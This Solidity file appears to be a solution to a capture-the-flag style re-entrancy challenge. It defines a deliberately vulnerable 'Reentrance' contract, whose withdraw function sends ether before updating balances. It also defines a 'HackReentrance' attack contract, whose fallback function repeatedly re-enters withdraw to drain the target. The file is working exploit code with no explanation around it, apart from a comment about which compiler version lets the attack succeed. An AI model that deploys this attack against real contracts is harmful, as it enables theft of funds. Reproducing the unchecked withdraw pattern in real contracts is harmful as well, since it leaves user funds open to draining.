// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;   // compiler 0.8 will report overflow for re-entrancy try, 0.6 ok

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  constructor() payable {

  }

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract HackReentrance {

    Reentrance c;
    uint amount;
    constructor(
        address _c,
        uint _amount
    ) {
        c = Reentrance(payable(_c));
        amount = _amount;
    }

    function withdraw(uint _amount) public {
      c.withdraw(_amount);
    }

    fallback() external payable {
        // when end ?
        if (address(c).balance == 0) {
            c.withdraw(amount + 1);
        } else if (address(c).balance > amount) {
            c.withdraw(amount);
        } else {
            c.withdraw(address(c).balance);
        }
    }
}
